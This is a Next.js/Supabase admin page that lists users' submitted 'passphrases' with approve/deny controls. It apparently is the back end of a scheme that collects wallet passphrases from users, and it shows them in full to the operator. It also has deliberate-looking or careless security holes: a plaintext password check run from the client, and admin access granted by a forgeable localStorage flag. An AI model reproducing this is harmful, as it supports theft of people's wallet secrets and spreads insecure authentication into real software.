'use client';

import { useEffect, useState } from 'react';
import { supabase } from '../lib/supabase';

type User = {
  id: number;
  passphrase: string;
  message: string;
  status: string;
  created_at: string;
};

export default function AdminPage() {
  const [username, setUsername] = useState('');
  const [password, setPassword] = useState('');
  const [loginError, setLoginError] = useState('');
  const [loading, setLoading] = useState(false);
  const [loggedIn, setLoggedIn] = useState(false);
  const [users, setUsers] = useState<User[]>([]);
  const [fetchLoading, setFetchLoading] = useState(true);

  useEffect(() => {
    const admin = localStorage.getItem('pi_admin');
    if (admin) { setLoggedIn(true); fetchUsers(); }
    else setFetchLoading(false);
  }, []);

  const fetchUsers = async () => {
    setFetchLoading(true);
    const { data } = await supabase.from('users').select('*').order('created_at', { ascending: false });
    if (data) setUsers(data);
    setFetchLoading(false);
  };

  const handleLogin = async (e: React.FormEvent) => {
    e.preventDefault();
    setLoading(true);
    setLoginError('');
    const { data } = await supabase.from('admins').select('*').eq('username', username.trim()).eq('password', password).single();
    if (!data) { setLoginError('Invalid admin credentials'); setLoading(false); return; }
    localStorage.setItem('pi_admin', JSON.stringify(data));
    setLoggedIn(true);
    fetchUsers();
    setLoading(false);
  };

  const updateStatus = async (id: number, status: string) => {
    await supabase.from('users').update({ status }).eq('id', id);
    setUsers(prev => prev.map(u => u.id === id ? { ...u, status } : u));
  };

  const handleLogout = () => { localStorage.removeItem('pi_admin'); setLoggedIn(false); setUsers([]); };

  if (!loggedIn) {
    return (
      <div className="min-h-screen flex items-center justify-center bg-gray-100 p-4">
        <div className="bg-white rounded-2xl shadow-xl p-8 w-full max-w-md">
          <div className="text-center mb-8">
            <h1 className="text-3xl font-bold text-gray-900">Admin Login</h1>
            <p className="text-gray-500 mt-2">Manage passphrase requests</p>
          </div>
          <form onSubmit={handleLogin} className="space-y-5">
            <div>
              <label className="block text-sm font-medium text-gray-700 mb-1">Username</label>
              <input type="text" value={username} onChange={(e) => setUsername(e.target.value)} placeholder="admin" required className="w-full px-4 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-amber-500 outline-none text-gray-900" />
            </div>
            <div>
              <label className="block text-sm font-medium text-gray-700 mb-1">Password</label>
              <input type="password" value={password} onChange={(e) => setPassword(e.target.value)} placeholder="••••••••" required className="w-full px-4 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-amber-500 outline-none text-gray-900" />
            </div>
            {loginError && <div className="bg-red-50 border border-red-200 text-red-700 px-4 py-3 rounded-lg text-sm">{loginError}</div>}
            <button type="submit" disabled={loading} className="w-full bg-amber-600 hover:bg-amber-700 text-white font-semibold py-3 rounded-lg transition disabled:opacity-50">
              {loading ? 'Signing in...' : 'Sign In'}
            </button>
          </form>
          <p className="text-center text-sm text-gray-500 mt-6"><a href="/" className="text-amber-600 hover:underline font-medium">User Portal</a></p>
        </div>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-gray-100">
      <header className="bg-white shadow-sm border-b">
        <div className="max-w-7xl mx-auto px-4 py-4 flex items-center justify-between">
          <h1 className="text-2xl font-bold text-gray-900">Admin Dashboard</h1>
          <div className="flex items-center gap-3">
            <button onClick={fetchUsers} className="px-4 py-2 bg-gray-200 hover:bg-gray-300 text-sm rounded-lg transition">Refresh</button>
            <button onClick={handleLogout} className="px-4 py-2 bg-red-500 hover:bg-red-600 text-white text-sm rounded-lg transition">Logout</button>
          </div>
        </div>
      </header>
      <main className="max-w-7xl mx-auto px-4 py-8">
        <div className="bg-white rounded-xl p-6 border shadow-sm mb-6">
          <p className="text-lg font-semibold text-gray-900">Pending: {users.filter(u => u.status === 'pending').length} &middot; Total: {users.length}</p>
        </div>
        {fetchLoading ? (
          <div className="flex items-center justify-center py-20"><div className="animate-spin h-10 w-10 border-4 border-amber-500 border-t-transparent rounded-full"></div></div>
        ) : users.length === 0 ? (
          <div className="bg-white rounded-xl p-12 text-center border"><p className="text-gray-500 text-lg">No requests yet.</p></div>
        ) : (
          users.map(user => (
            <div key={user.id} className="bg-white rounded-xl p-6 border shadow-sm mb-4">
              <div className="flex items-start justify-between">
                <div className="space-y-3 flex-1">
                  <div className="bg-amber-50 border-2 border-amber-200 rounded-xl p-4">
                    <p className="text-xs text-amber-600 font-bold uppercase">🔑 Passphrase</p>
                    <p className="font-mono text-xl font-bold text-amber-900 break-all mt-1">{user.passphrase}</p>
                  </div>
                  {user.message && user.message !== 'No message' && (
                    <div className="bg-gray-50 rounded-lg px-4 py-2 border"><p className="text-xs text-gray-400 font-medium">Message</p><p className="text-sm text-gray-600 mt-0.5">{user.message}</p></div>
                  )}
                  <p className="text-xs text-gray-400">{new Date(user.created_at).toLocaleString()}</p>
                </div>
                <span className={`px-3 py-1 rounded-full text-xs font-semibold ml-4 ${user.status === 'approved' ? 'bg-green-100 text-green-700' : user.status === 'denied' ? 'bg-red-100 text-red-700' : 'bg-yellow-100 text-yellow-700'}`}>{user.status}</span>
              </div>
              {user.status === 'pending' && (
                <div className="flex gap-3 mt-4 pt-4 border-t">
                  <button onClick={() => updateStatus(user.id, 'approved')} className="bg-green-600 hover:bg-green-700 text-white px-5 py-2 rounded-lg text-sm">✅ Approve</button>
                  <button onClick={() => updateStatus(user.id, 'denied')} className="bg-red-600 hover:bg-red-700 text-white px-5 py-2 rounded-lg text-sm">❌ Deny</button>
                </div>
              )}
            </div>
          ))
        )}
      </main>
    </div>
  );
}